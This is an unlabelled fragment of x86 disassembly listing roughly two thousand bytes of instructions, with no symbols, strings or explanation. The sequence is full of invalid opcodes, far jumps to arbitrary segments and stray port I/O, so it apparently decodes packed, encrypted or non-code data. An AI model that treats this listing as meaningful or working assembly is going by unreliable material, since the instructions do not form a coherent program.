  406f86:	sti    
  406f87:	fldenv [ebp+0x20]
  406f8a:	aas    
  406f8b:	push   edx
  406f8c:	xor    ebp,DWORD PTR [edx]
  406f8e:	add    DWORD PTR [ecx+0x10],ebx
  406f91:	call   0x2521cd16
  406f96:	dec    ebx
  406f97:	and    al,0x8e
  406f99:	and    dh,ah
  406f9b:	and    bh,bh
  406f9d:	pushf  
  406f9e:	jno    0x406f9d
  406fa0:	retf   
  406fa1:	xor    BYTE PTR [esi+eiz*4-0x298b5d9e],0x54
  406fa9:	fs jne 0x406f66
  406fac:	lea    eax,[edi+0x23]
  406faf:	sbb    DWORD PTR [esi+0x6a228b20],edx
  406fb5:	clc    
  406fb6:	inc    ebx
  406fb7:	stos   DWORD PTR es:[edi],eax
  406fb8:	mul    BYTE PTR [ecx+0x1c]
  406fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fbc:	push   dx
  406fbe:	(bad)  
  406fc0:	div    DWORD PTR [edx+0x2f]
  406fc3:	xchg   edx,eax
  406fc4:	xor    al,0x92
  406fc6:	pop    edx
  406fc7:	imul   edx,ecx,0xc
  406fca:	jmp    0xa9b49aba
  406fcf:	js     0x407034
  406fd1:	pop    esp
  406fd2:	inc    eax
  406fd3:	out    0x1f,eax
  406fd5:	lods   eax,DWORD PTR ds:[esi]
  406fd6:	jg     0x406f99
  406fd8:	inc    esp
  406fd9:	adc    ebx,DWORD PTR [ebx]
  406fdb:	dec    ecx
  406fdc:	ret    
  406fdd:	dec    ebp
  406fde:	mov    ch,0x52
  406fe0:	xchg   BYTE PTR [edx-0x2c],cl
  406fe3:	xchg   DWORD PTR [esi],edx
  406fe5:	data16 stc 
  406fe7:	xchg   DWORD PTR [esi],edx
  406fe9:	push   ecx
  406fea:	dec    esi
  406feb:	mov    al,ds:0xddf99c4a
  406ff0:	loope  0x406ff5
  406ff2:	jne    0x407070
  406ff4:	sbb    DWORD PTR [ecx+edx*1],0xffffffbe
  406ff8:	jmp    0x73bc3ed4
  406ffd:	xchg   esi,eax
  406ffe:	ror    edi,cl
  407000:	fdiv   DWORD PTR [esp+ebp*4+0x51]
  407004:	in     al,dx
  407005:	xchg   edi,eax
  407006:	test   DWORD PTR [ecx],0x1c373866
  40700c:	push   0xffffffb7
  40700e:	mov    edi,es
  407010:	(bad)  
  407011:	mov    ah,0x59
  407013:	dec    esi
  407014:	cmp    al,0xca
  407016:	dec    ebp
  407017:	(bad)  
  407019:	aad    0xc9
  40701b:	sub    dl,BYTE PTR [eax]
  40701d:	fidivr WORD PTR [eax-0x43]
  407020:	das    
  407021:	pop    esi
  407022:	fs (bad) 
  407024:	mov    cl,0x4d
  407026:	mov    ah,0xbb
  407028:	mov    ecx,0xd60eb2b2
  40702d:	lock leave 
  40702f:	jb     0x40704c
  407031:	aad    0x61
  407033:	inc    edi
  407034:	stc    
  407035:	and    DWORD PTR [edx-0x22],eax
  407038:	or     DWORD PTR [ebx],eax
  40703a:	enter  0xb11e,0x6b
  40703e:	cmp    edi,edi
  407040:	adc    cl,BYTE PTR [edi+0x4f]
  407043:	(bad)  
  407044:	push   ecx
  407045:	mov    edx,0x76b53401
  40704a:	xor    bh,BYTE PTR [ebx+0x359d0ffb]
  407050:	xlat   BYTE PTR ds:[ebx]
  407051:	test   bh,ah
  407053:	ficom  DWORD PTR ds:0xb0effbcb
  407059:	mov    esi,0xd74a6e91
  40705e:	xchg   ebx,eax
  40705f:	mov    DWORD PTR [ebx+0x22],ebp
  407062:	lahf   
  407063:	ret    0x72fa
  407066:	xchg   esp,eax
  407067:	push   ds
  407068:	ins    BYTE PTR es:[edi],dx
  407069:	sbb    DWORD PTR [ebp+0x6e],esi
  40706c:	popf   
  40706d:	pusha  
  40706e:	mov    dl,0x5c
  407070:	sbb    al,0x4c
  407072:	inc    esi
  407073:	loopne 0x40708f
  407075:	cs imul esp,ecx,0xffffffdd
  407079:	dec    ebp
  40707a:	dec    ebx
  40707b:	xchg   esi,eax
  40707c:	sar    DWORD PTR [ebp+0x6],cl
  40707f:	mov    eax,0xb3ddcfb
  407084:	mov    esi,0x830bb5bc
  407089:	mov    ds:0x585a6dc3,eax
  40708e:	or     BYTE PTR ds:0xd47bcddd,0xaf
  407095:	mov    esp,0x9d3e5dd8
  40709a:	test   BYTE PTR [edx+0x42106baf],dl
  4070a0:	lods   al,BYTE PTR ds:[esi]
  4070a1:	and    DWORD PTR [edx-0x151a9d66],esi
  4070a7:	hlt    
  4070a8:	stos   DWORD PTR es:[edi],eax
  4070a9:	mov    WORD PTR ds:0x3d3cdfe6,?
  4070af:	adc    DWORD PTR [edi+0x3f],ecx
  4070b2:	fadd   st(1),st
  4070b4:	scas   al,BYTE PTR es:[edi]
  4070b5:	call   0x16bfdd7b
  4070ba:	sbb    al,0x3b
  4070bc:	mov    bl,BYTE PTR fs:[ebp+eax*1-0x19874200]
  4070c4:	sbb    DWORD PTR [ecx],esp
  4070c6:	jb     0x40712f
  4070c8:	sub    esp,DWORD PTR [eax]
  4070ca:	ins    BYTE PTR es:[edi],dx
  4070cb:	dec    ecx
  4070cc:	test   BYTE PTR [ebx-0x57],dh
  4070cf:	clc    
  4070d0:	cmp    DWORD PTR [esi],esp
  4070d2:	int3   
  4070d3:	cmp    dh,BYTE PTR [esi+0x4f0dab64]
  4070d9:	dec    esi
  4070da:	nop
  4070db:	mov    ah,0xda
  4070dd:	and    al,0xe2
  4070df:	enter  0xb061,0x2e
  4070e3:	mov    ebp,0x8a2e2cbf
  4070e8:	xchg   ecx,eax
  4070e9:	scas   eax,DWORD PTR es:[edi]
  4070ea:	inc    esp
  4070eb:	scas   al,BYTE PTR es:[edi]
  4070ec:	mov    dh,0x3a
  4070ee:	pop    esi
  4070ef:	inc    ecx
  4070f0:	mov    ?,WORD PTR [ebx+edi*8-0x6b17cd66]
  4070f7:	adc    BYTE PTR [eax-0x61139b32],ch
  4070fd:	mov    dl,0x1c
  4070ff:	into   
  407100:	addr16 xchg ecx,eax
  407102:	sbb    eax,0x4a7f8d96
  407107:	adc    BYTE PTR [edi-0x568a0c77],bh
  40710d:	cli    
  40710e:	pop    edi
  40710f:	(bad)  
  407110:	out    0xa5,eax
  407112:	push   0xffffffd7
  407114:	lods   eax,DWORD PTR ds:[esi]
  407115:	arpl   WORD PTR [ecx-0x9],sp
  407118:	loopne 0x407107
  40711a:	pop    ebx
  40711b:	cmp    ebx,0xffffff8e
  40711e:	jmp    0x407133
  407120:	and    DWORD PTR [ecx+eiz*1+0x35918f16],ebx
  407127:	pusha  
  407128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407129:	mov    edi,DWORD PTR [ecx+0x45ad8451]
  40712f:	mov    ah,0xe
  407131:	sbb    sp,WORD PTR [bp+si+0x5bc2]
  407137:	aam    0x28
  407139:	xor    eax,0x6d84d6a6
  40713e:	and    eax,edx
  407140:	cmp    al,BYTE PTR [edi]
  407142:	imul   edi,DWORD PTR [esi+eiz*2+0x467ce3e7],0x74
  40714a:	xor    eax,0x9a2bfdbe
  40714f:	out    0xc7,eax
  407151:	push   ebp
  407152:	lods   eax,DWORD PTR ds:[esi]
  407153:	sbb    edi,esi
  407155:	shr    DWORD PTR [ebp-0x17],1
  407158:	pop    es
  407159:	shl    BYTE PTR [eax+0x6b0659be],0xa8
  407160:	mov    ebx,0xba509b6a
  407165:	dec    edi
  407166:	sbb    BYTE PTR [ebp-0x61cf825b],dl
  40716c:	push   esi
  40716d:	mov    ecx,0x51ab5bcb
  407172:	mov    cl,0x23
  407174:	mov    ebp,0xc55049bb
  407179:	aad    0x20
  40717b:	pusha  
  40717c:	daa    
  40717d:	ret    0xbfc2
  407180:	pop    ebx
  407181:	in     al,0x2f
  407183:	push   ds
  407184:	ret    
  407185:	cs add BYTE PTR ds:[ebx],al
  407189:	xchg   edx,eax
  40718a:	ja     0x4071c1
  40718c:	push   edx
  40718d:	and    dl,dh
  40718f:	sahf   
  407190:	mov    al,0x68
  407192:	(bad)  [ebp+0x1]
  407195:	cs je  0x4071b8
  407198:	dec    edi
  407199:	test   eax,0x63666b76
  40719e:	call   0x2a2510eb
  4071a3:	adc    ebx,DWORD PTR [edi-0x42]
  4071a6:	push   esp
  4071a7:	fsub   QWORD PTR [edi-0x7f]
  4071aa:	adc    al,0xad
  4071ac:	out    0x12,al
  4071ae:	cmp    DWORD PTR [esi],edx
  4071b0:	call   0xff06:0x8d9412e2
  4071b7:	mov    al,ch
  4071b9:	dec    edi
  4071ba:	inc    ebp
  4071bb:	adc    DWORD PTR [edi+esi*1-0xfa095c5],ecx
  4071c2:	call   0x1baf:0x73665b5
  4071c9:	hlt    
  4071ca:	add    eax,DWORD PTR [ecx-0x5166cd4]
  4071d0:	and    dl,BYTE PTR [edx-0x69]
  4071d3:	clc    
  4071d4:	(bad)  
  4071d5:	push   ebx
  4071d6:	lahf   
  4071d7:	sbb    ecx,DWORD PTR [edi+0x4f5f012]
  4071dd:	daa    
  4071de:	inc    ebx
  4071df:	scas   eax,DWORD PTR es:[edi]
  4071e0:	and    bl,ch
  4071e2:	push   ebx
  4071e3:	fbstp  TBYTE PTR [ebx+0x5b]
  4071e6:	aad    0x44
  4071e8:	push   ecx
  4071e9:	retf   0x808a
  4071ec:	in     al,0x11
  4071ee:	xchg   ebp,eax
  4071ef:	loopne 0x407252
  4071f1:	jmp    0x6c9667d2
  4071f6:	xor    ecx,ebp
  4071f8:	ins    DWORD PTR es:[edi],dx
  4071f9:	cs pop ebp
  4071fb:	jb     0x4071af
  4071fd:	out    0x89,al
  4071ff:	fild   QWORD PTR [eax+0x1]
  407202:	sbb    BYTE PTR [edi],0x30
  407205:	xchg   dh,al
  407207:	sub    BYTE PTR [ebx],0xea
  40720a:	fdivr  DWORD PTR [esi+0x2242c6b9]
  407210:	leave  
  407211:	xor    eax,0x6f65eea6
  407216:	call   0xd45f:0x7c60c7e8
  40721d:	imul   edi,edi,0xffffffbc
  407220:	sub    DWORD PTR ds:0x97d8ecf1,esi
  407226:	sbb    ebx,DWORD PTR [edi]
  407228:	jmp    DWORD PTR [eax+esi*1+0x1f]
  40722c:	dec    ebp
  40722d:	jne    0x4071f1
  40722f:	test   al,0xd4
  407231:	addr16 pop ds
  407233:	jnp    0x407252
  407235:	ds dec ebx
  407237:	inc    ecx
  407238:	call   0x67d31f88
  40723d:	mov    es,WORD PTR [edi+edi*4+0x7a2fbae2]
  407244:	jnp    0x40721b
  407246:	stos   BYTE PTR es:[edi],al
  407247:	add    DWORD PTR [ecx],0x88130106
  40724d:	dec    ebx
  40724e:	pop    eax
  40724f:	scas   al,BYTE PTR es:[edi]
  407250:	call   0xb91:0x7e624b21
  407257:	fs rcr bl,cl
  40725a:	xlat   BYTE PTR ds:[ebx]
  40725b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40725c:	xor    edi,DWORD PTR [esi+0x75]
  40725f:	ins    DWORD PTR es:[edi],dx
  407260:	adc    ebx,ebp
  407262:	sbb    DWORD PTR [eax-0x647ad698],0xfffffffd
  407269:	sub    edx,DWORD PTR [edx]
  40726b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40726c:	lock or BYTE PTR ds:0x6c5dccf4,al
  407273:	xchg   esi,eax
  407274:	or     DWORD PTR ds:[ebx+edi*2],ecx
  407278:	mov    edi,0x9f180857
  40727d:	cmc    
  40727e:	mov    bl,0x7d
  407280:	push   edx
  407281:	push   0x38
  407283:	cld    
  407284:	and    eax,0xe58a7f89
  407289:	xchg   esi,eax
  40728a:	dec    esi
  40728b:	or     al,0xbb
  40728d:	mov    eax,0x9e1efdab
  407292:	mov    ecx,0x5191a16e
  407297:	sbb    al,0x5d
  407299:	gs sbb dh,bh
  40729c:	sub    BYTE PTR [edx+0x5a],ch
  40729f:	push   cs
  4072a0:	and    al,0xe2
  4072a2:	push   ds
  4072a3:	mov    BYTE PTR [edi+ebp*2],al
  4072a6:	mov    esp,0x215159a7
  4072ab:	xchg   ebp,eax
  4072ac:	arpl   dx,bx
  4072ae:	cmp    ah,BYTE PTR [ecx+0x75261936]
  4072b4:	cwde   
  4072b5:	adc    al,BYTE PTR [ecx+0xd3bc43f]
  4072bb:	shr    dh,0x38
  4072be:	enter  0x57ce,0x9b
  4072c2:	fwait
  4072c3:	retf   
  4072c4:	sbb    eax,0xc7a58325
  4072c9:	xchg   BYTE PTR [esi-0x70],ah
  4072cc:	jno    0x4072ca
  4072ce:	mov    al,ds:0xf0c435a1
  4072d3:	les    ebp,FWORD PTR [ebp-0x48]
  4072d6:	gs and esi,ecx
  4072d9:	mov    ds:0x8bdcd6c2,al
  4072de:	(bad)  
  4072e0:	mov    ch,BYTE PTR [edi]
  4072e2:	mov    eax,ds:0x5315c76c
  4072e7:	test   eax,0x6f2cb885
  4072ec:	and    bl,cl
  4072ee:	mov    dl,0x79
  4072f0:	jmp    FWORD PTR [edi+ecx*4+0x77ba8b73]
  4072f7:	cmp    eax,0xed01056
  4072fc:	mov    esi,0xfdc947cb
  407301:	add    bl,BYTE PTR [ebp-0x283d3ead]
  407307:	hlt    
  407308:	enter  0x6c6,0x5
  40730c:	loop   0x407315
  40730e:	fwait
  40730f:	push   edx
  407310:	sbb    BYTE PTR [eax+0x2ddf0de4],al
  407316:	sub    eax,0x50d44646
  40731b:	js     0x407312
  40731d:	fidiv  WORD PTR [esi+0x7b1a772c]
  407323:	adc    bh,BYTE PTR [ebx+0x6637b553]
  407329:	fidivr DWORD PTR [eax]
  40732b:	or     bh,BYTE PTR [edi-0x7b]
  40732e:	cmp    esp,DWORD PTR [eax]
  407330:	mov    dl,0x7e
  407332:	(bad)  [ecx+0x6a]
  407335:	jo     0x4072bf
  407337:	fwait
  407338:	inc    esi
  407339:	shl    DWORD PTR [eax-0x5a38a99e],0xa6
  407340:	dec    esi
  407341:	fdivr  QWORD PTR [esi+0x683074ed]
  407347:	lods   eax,DWORD PTR ds:[esi]
  407348:	ret    0xcfaa
  40734b:	data16 (bad) 
  40734d:	(bad)  
  40734f:	xchg   esi,eax
  407350:	test   dl,bh
  407352:	imul   edi,DWORD PTR [edi+esi*8-0x20],0x8525a249
  40735a:	push   ecx
  40735b:	in     al,0x81
  40735d:	sbb    al,0x8d
  40735f:	and    eax,0x76426706
  407364:	pop    eax
  407365:	sbb    DWORD PTR [ebp+0x42],esp
  407368:	idiv   esp
  40736a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40736b:	xor    al,0x1
  40736d:	cdq    
  40736e:	dec    esp
  40736f:	jp     0x407351
  407371:	add    BYTE PTR [edx+0x54],ch
  407374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407375:	xchg   esp,eax
  407376:	add    eax,DWORD PTR [esi+0x7bd9dfc0]
  40737c:	pop    edi
  40737d:	leave  
  40737e:	adc    ebx,DWORD PTR [ecx-0x65]
  407381:	add    DWORD PTR [esi-0x46],edx
  407384:	push   edx
  407385:	inc    ebp
  407386:	js     0x407339
  407388:	xor    eax,0x83245f32
  40738d:	cmp    al,0xc2
  40738f:	cmc    
  407390:	adc    bh,cl
  407392:	(bad)  
  407394:	mov    ebp,0x38a31a1d
  407399:	outs   dx,DWORD PTR ds:[esi]
  40739a:	push   es
  40739b:	psubq  mm1,QWORD PTR [ebp+ebp*1-0x426230b5]
  4073a3:	push   es
  4073a4:	int3   
  4073a5:	les    ebx,FWORD PTR [edi+0x1f]
  4073a8:	fsub   QWORD PTR [ebx+0x4b]
  4073ab:	push   0xb1f2615f
  4073b0:	leave  
  4073b1:	inc    eax
  4073b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073b3:	push   edx
  4073b4:	and    al,0x76
  4073b6:	(bad)  
  4073b7:	jmp    0x85ff:0xfad0dbf
  4073be:	xor    bh,BYTE PTR [ebp-0x2e871f3c]
  4073c4:	mov    ds:0xba3225f1,eax
  4073c9:	inc    ebx
  4073ca:	lds    esi,FWORD PTR [eax]
  4073cc:	fidivr WORD PTR [edi]
  4073ce:	sti    
  4073cf:	inc    edi
  4073d0:	mov    al,0xa5
  4073d2:	add    ebp,DWORD PTR [ecx+ecx*8-0x806e365]
  4073d9:	cmp    eax,0x31bb001d
  4073de:	sub    ebp,edx
  4073e0:	dec    ebx
  4073e1:	repnz arpl di,sp
  4073e4:	out    dx,al
  4073e5:	fdivr  st,st(7)
  4073e7:	cmp    ebp,edi
  4073e9:	aam    0xaf
  4073eb:	mov    esi,0x8d9175f0
  4073f0:	sub    ah,BYTE PTR [ebx+ecx*8]
  4073f3:	jp     0x40742f
  4073f5:	inc    esp
  4073f6:	push   ebp
  4073f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073f8:	fstp   TBYTE PTR [ecx-0x28]
  4073fb:	adc    eax,0x92f0386e
  407400:	adc    al,0x63
  407402:	inc    edi
  407403:	cmp    eax,0x13ef1f6d
  407408:	lock test eax,0xc85284f3
  40740e:	inc    ebx
  40740f:	hlt    
  407410:	mov    dh,0x63
  407412:	push   esi
  407413:	inc    ebx
  407414:	sbb    al,0x4b
  407416:	(bad)  
  407417:	sahf   
  407418:	fstp   DWORD PTR [edi-0x7a8ffddd]
  40741e:	mov    edi,0xe9a81f2e
  407423:	in     eax,dx
  407424:	(bad)  
  407425:	adc    al,0xba
  407427:	pop    bp
  407429:	pop    edx
  40742a:	and    eax,0xbbe7ca7
  40742f:	xchg   ebx,eax
  407430:	and    eax,0xdb4b90a8
  407435:	mov    dl,0xde
  407437:	or     ah,BYTE PTR [esi+0x75]
  40743a:	jbe    0x40746f
  40743c:	lds    ecx,FWORD PTR [edi-0x530edbce]
  407442:	cdq    
  407443:	(bad)  [edi-0x31857e4a]
  407449:	repz lahf 
  40744b:	aas    
  40744c:	loopne 0x40742d
  40744e:	dec    esp
  40744f:	pop    ds
  407450:	add    DWORD PTR [esi-0x47969e39],eax
  407456:	test   eax,0x634435a9
  40745b:	mov    al,ds:0xb776b0d9
  407460:	retf   0xaeab
  407463:	arpl   WORD PTR [edx+0x171d3e2e],bx
  407469:	inc    eax
  40746a:	mov    edx,0xcd53983c
  40746f:	pop    es
  407470:	push   esp
  407471:	dec    edx
  407472:	stc    
  407473:	shr    DWORD PTR [ebx-0x1f6790db],0x93
  40747a:	popf   
  40747b:	out    0x71,al
  40747d:	ficom  WORD PTR [eax-0x1fb98dd1]
  407483:	jno    0x407455
  407485:	retf   0xcee2
  407488:	shl    DWORD PTR [edx],0x46
  40748b:	lds    ebp,FWORD PTR [ebp+0x6613e5ce]
  407491:	fs inc edi
  407493:	and    BYTE PTR [edi],0x7
  407496:	imul   eax,DWORD PTR ds:0xe8b32a7,0x67
  40749d:	retf   
  40749e:	and    al,bh
  4074a0:	jg     0x407475
  4074a2:	pop    edi
  4074a3:	mov    cl,bh
  4074a5:	adc    BYTE PTR [ecx],0x72
  4074a8:	dec    esi
  4074a9:	mov    esi,0x46f6309a
  4074ae:	jmp    DWORD PTR [ebx-0x68a763b9]
  4074b4:	mov    edi,0xfc21853d
  4074b9:	jb     0x407526
  4074bb:	retf   
  4074bc:	pop    eax
  4074bd:	int    0x54
  4074bf:	push   eax
  4074c0:	mov    WORD PTR [eax+0x7],?
  4074c3:	stc    
  4074c4:	fnstsw WORD PTR [ecx+0x50849c0f]
  4074ca:	sub    cl,ch
  4074cc:	jmp    0xa86412cc
  4074d1:	cmc    
  4074d2:	mov    eax,ds:0x8d72f25c
  4074d7:	(bad)  
  4074d8:	outs   dx,BYTE PTR ds:[esi]
  4074d9:	(bad)  
  4074da:	and    bh,BYTE PTR [edx+eiz*8+0x3b216990]
  4074e1:	ja     0x407551
  4074e3:	fs mov edx,0xdc8ff83f
  4074e9:	and    DWORD PTR [edi-0x520e6073],eax
  4074ef:	imul   edx,DWORD PTR [eax],0x4a829428
  4074f5:	std    
  4074f6:	loopne 0x4074b6
  4074f8:	jmp    0x6c54:0x9071ded7
  4074ff:	test   BYTE PTR [ebx+0x6f],0x20
  407503:	sbb    BYTE PTR [esi],dh
  407505:	mov    bl,0xce
  407507:	mov    edi,0x8b8b7163
  40750c:	jp     0x4074e5
  40750e:	push   esi
  40750f:	pop    edx
  407510:	mov    ebp,0xc275f2a2
  407515:	cmp    dl,BYTE PTR [ebx+ebx*2+0x5f]
  407519:	popa   
  40751a:	cmp    al,bl
  40751c:	imul   ebp,edx,0xffffffdd
  40751f:	outs   dx,DWORD PTR ds:[esi]
  407520:	es clc 
  407522:	sbb    BYTE PTR [ecx+0xc],dl
  407525:	mov    ebx,0xcf11e41
  40752a:	jmp    0x4074c4
  40752c:	scas   eax,DWORD PTR es:[edi]
  40752d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40752e:	in     eax,0xd2
  407530:	inc    ebx
  407531:	pavgw  mm7,QWORD PTR [eax]
  407534:	aad    0x21
  407536:	shl    DWORD PTR [eax-0xf],1
  407539:	jno    0x407587
  40753b:	mov    ah,0xd
  40753d:	int3   
  40753e:	int3   
  40753f:	sub    DWORD PTR ds:0xd8c973ed,ecx
  407545:	dec    edx
  407546:	adc    DWORD PTR ds:0x6b5667e8,esi
  40754c:	push   edx
  40754d:	sbb    DWORD PTR [edx+0x1d],edi
  407550:	(bad)  
  407552:	loope  0x4075c9
  407554:	hlt    
  407555:	push   esp
  407556:	pop    ecx
  407557:	inc    edx
  407558:	in     eax,dx
  407559:	test   al,0x4c
  40755b:	fsubr  QWORD PTR [edi]
  40755d:	daa    
  40755e:	sub    eax,0x99e4738f
  407563:	sub    eax,0x2437b64e
  407568:	inc    esi
  407569:	ds imul edx,esi,0x23401535
  407570:	xchg   ebx,eax
  407571:	dec    esi
  407572:	mov    esp,0xb36aba76
  407577:	les    esi,FWORD PTR [ecx]
  407579:	jno    0x4074ff
  40757b:	not    al
  40757d:	mov    ecx,0x9b477b9b
  407582:	retf   
  407583:	shl    DWORD PTR [edi],0x37
  407586:	lock out 0x22,eax
  407589:	adc    DWORD PTR [ecx],ebp
  40758b:	ins    DWORD PTR es:[edi],dx
  40758c:	push   ecx
  40758d:	mov    sp,0xb271
  407591:	jne    0x4075a3
  407593:	jge    0x40754a
  407595:	or     DWORD PTR [esi-0x30],ecx
  407598:	pop    ebx
  407599:	shr    BYTE PTR [eax],cl
  40759b:	xchg   ecx,eax
  40759c:	ins    DWORD PTR es:[edi],dx
  40759d:	repnz pop ecx
  40759f:	jge    0x4075cc
  4075a1:	pop    esp
  4075a2:	jmp    0xd9e0ee96
  4075a7:	clc    
  4075a8:	xchg   ebp,eax
  4075a9:	xor    al,0x46
  4075ab:	or     al,0x74
  4075ad:	add    al,0xbd
  4075af:	ret    
  4075b0:	test   BYTE PTR ss:[ebx+0x1e859ae1],0x5b
  4075b8:	adc    BYTE PTR [esp+eiz*8],al
  4075bb:	retf   0xb337
  4075be:	pop    ecx
  4075bf:	(bad)  
  4075c1:	xor    DWORD PTR [edx+0x72],ecx
  4075c4:	leave  
  4075c5:	daa    
  4075c6:	arpl   WORD PTR [eax+0x1e55616],sp
  4075cc:	(bad)  
  4075cd:	push   ebp
  4075ce:	scas   al,BYTE PTR es:[edi]
  4075cf:	bound  esp,QWORD PTR [ebx+0x56]
  4075d2:	std    
  4075d3:	ficomp WORD PTR [ecx]
  4075d5:	mov    BYTE PTR [ebx+0x4e],dh
  4075d8:	pushf  
  4075d9:	pop    edi
  4075da:	out    dx,eax
  4075db:	mov    edi,ebp
  4075dd:	(bad)  
  4075de:	jge    0x40764a
  4075e0:	cld    
  4075e1:	or     DWORD PTR [edi+0x2b],esi
  4075e4:	jl     0x407623
  4075e6:	lods   eax,DWORD PTR ds:[esi]
  4075e7:	ja     0x4075ac
  4075e9:	cli    
  4075ea:	push   ebp
  4075eb:	in     al,dx
  4075ec:	(bad)  
  4075ed:	cmp    edx,DWORD PTR [edi-0xb]
  4075f0:	(bad)  
  4075f1:	xor    al,0xf8
  4075f3:	inc    eax
  4075f4:	xor    eax,edx
  4075f6:	dec    esi
  4075f7:	push   cs
  4075f8:	sub    eax,edx
  4075fa:	sbb    al,cl
  4075fc:	xor    eax,DWORD PTR [edx+0x7a]
  4075ff:	enter  0x376e,0x4a
  407603:	hlt    
  407604:	pusha  
  407605:	sub    ebp,DWORD PTR [eax]
  407607:	push   ss
  407608:	sbb    al,BYTE PTR [edx-0xc796dd4]
  40760e:	add    eax,0xf758e001
  407613:	inc    eax
  407614:	sbb    cl,BYTE PTR [edx]
  407616:	cmc    
  407617:	sbb    bl,BYTE PTR [esi+0x503591d1]
  40761d:	out    0xb2,al
  40761f:	or     ch,BYTE PTR ds:0x47d5cfff
  407625:	(bad)  [eax-0x745132a3]
  40762b:	scas   eax,DWORD PTR es:[edi]
  40762c:	jl     0x4075c4
  40762e:	aam    0x68
  407630:	ja     0x407676
  407632:	or     ecx,DWORD PTR [edx]
  407634:	stos   BYTE PTR es:[edi],al
  407635:	sbb    eax,0xaeced201
  40763a:	ins    BYTE PTR es:[edi],dx
  40763b:	adc    BYTE PTR [esi-0x11],0xc7
  40763f:	pop    ebx
  407640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407641:	mov    eax,0x4c9a4803
  407646:	add    al,0x85
  407648:	in     al,dx
  407649:	int    0x55
  40764b:	inc    esp
  40764d:	jno    0x407607
  40764f:	cmc    
  407650:	nop
  407651:	popf   
  407652:	test   eax,0x3d4195bf
  407657:	push   cs
  407658:	das    
  407659:	fst    DWORD PTR [ecx+0x56ce332a]
  40765f:	neg    ebx
  407661:	mov    cl,0xbb
  407663:	xor    al,0x3f
  407665:	scas   eax,DWORD PTR es:[edi]
  407666:	lods   al,BYTE PTR ds:[esi]
  407667:	lea    eax,[esi]
  407669:	sbb    eax,DWORD PTR [eax+0x7d]
  40766c:	push   0x77cb5c2b
  407671:	xchg   BYTE PTR [edx-0x6d],dh
  407674:	push   esi
  407675:	xchg   ecx,eax
  407676:	nop
  407677:	cmp    eax,0x95de04a2
  40767c:	lock fnstsw WORD PTR [edx-0x126332db]
  407683:	sub    DWORD PTR [edx-0x6c26f431],eax
  407689:	xchg   ecx,eax
  40768a:	fsub   QWORD PTR [esi+0x4136da84]
  407690:	mov    esi,DWORD PTR [ebp+0x18fe988f]
  407696:	or     esp,edx
  407698:	fdivr  DWORD PTR [edi]
  40769a:	call   0xefab:0xd0f9437
  4076a1:	dec    edi
  4076a2:	jns    0x40764c
  4076a4:	fs sbb al,0x90
  4076a7:	int3   
  4076a8:	xor    eax,0x878c53d6
  4076ad:	mov    al,BYTE PTR [esi-0x30873748]
  4076b3:	push   ss
  4076b4:	inc    ebx
  4076b5:	out    dx,eax
  4076b6:	imul   esi,DWORD PTR [edi+ecx*8],0xb7dcc20c
  4076bd:	xor    esp,DWORD PTR [eax]
  4076bf:	mov    edi,0x58dbbbfa
  4076c4:	das    
  4076c5:	and    eax,0x2f0c26ec
  4076ca:	jmp    0x6655:0x7ad35c5f
  4076d1:	int    0x55
  4076d3:	imul   ebx,DWORD PTR ds:0xc8db7cc4,0xdf5f3ed1
  4076dd:	mov    dl,0x97
  4076df:	lahf   
  4076e0:	aam    0xd8
  4076e2:	xchg   esp,eax
  4076e3:	test   eax,0x8b519ef2
  4076e8:	pusha  
  4076e9:	imul   eax,DWORD PTR [edx],0xfe608530
  4076ef:	dec    eax
  4076f0:	cmc    
  4076f1:	outs   dx,BYTE PTR ds:[esi]
  4076f2:	mov    ebx,0x9b0b88c
  4076f7:	push   cs
  4076f8:	dec    ebx
  4076f9:	mov    esi,0x25fd8111
  4076fe:	pop    ebx
  4076ff:	push   esi
  407700:	sti    
  407701:	mov    eax,ds:0xbf98bf02
  407706:	arpl   WORD PTR [ebp-0x1900051c],ax
  40770c:	iret   
  40770d:	mov    edi,0x4833669d
  407712:	dec    ecx
  407713:	fnstenv [edx-0x41599186]
  407719:	xor    edi,DWORD PTR [edi-0x55cd0710]
  40771f:	mov    dl,0x10
  407721:	in     al,0xe4
  407723:	mov    ch,0x5d
  407725:	pusha  
  407726:	inc    edi
  407727:	push   0x79
  407729:	mov    ds:0xb1e56240,al
  40772e:	and    DWORD PTR [ebx],ebp
  407730:	leave  
  407731:	dec    ebx
  407732:	or     al,0x99
  407734:	mov    ah,0xea
  407736:	out    0x40,eax
  407738:	je     0x407729
  40773a:	inc    ebp
  40773b:	cld    
  40773c:	ret    0x6bb7
  40773f:	sbb    BYTE PTR [esi+edi*8],0x2b
  407743:	adc    DWORD PTR [ecx-0x5f],ecx
  407746:	out    dx,al
  407747:	and    al,BYTE PTR [ecx+0x1a]
  40774a:	popf   
  40774b:	jge    0x407710
  40774d:	and    esp,esp
  40774f:	es push eax
  407751:	pop    eax
  407752:	imul   edx,DWORD PTR [ebx+eiz*4],0xffffff98
  407756:	jg     0x4076e9
  407758:	adc    eax,0xa5dab827
  40775d:	test   DWORD PTR [ebx+0xcf974ab],edi
  407763:	mov    al,BYTE PTR [ebx+ecx*2]
  407766:	push   ds
  407767:	fiadd  DWORD PTR [edx-0x1f]
  40776a:	(bad)  
  40776b:	mov    esi,0x170b02ef
  407770:	pop    ebx
  407771:	xchg   esp,eax
  407772:	mov    esi,0x7c37ec98
  407777:	or     BYTE PTR ds:0x378c0a6b,ch
  40777d:	ss out dx,eax
  40777f:	pop    esi
  407780:	ret    0x1379
  407783:	dec    ecx
  407784:	fldl2e 
  407786:	jge    0x4077ad
  407788:	jl     0x407794
  40778a:	pop    eax
  40778b:	xor    dl,BYTE PTR [edx-0x56]
  40778e:	ror    BYTE PTR [esi],cl
  407790:	(bad)  
  407792:	xlat   BYTE PTR ds:[ebx]
  407793:	cmp    al,0x9f
  407795:	xchg   edx,eax
  407796:	jp     0x407779
  407798:	adc    DWORD PTR [ecx],edx
  40779a:	or     al,0x34
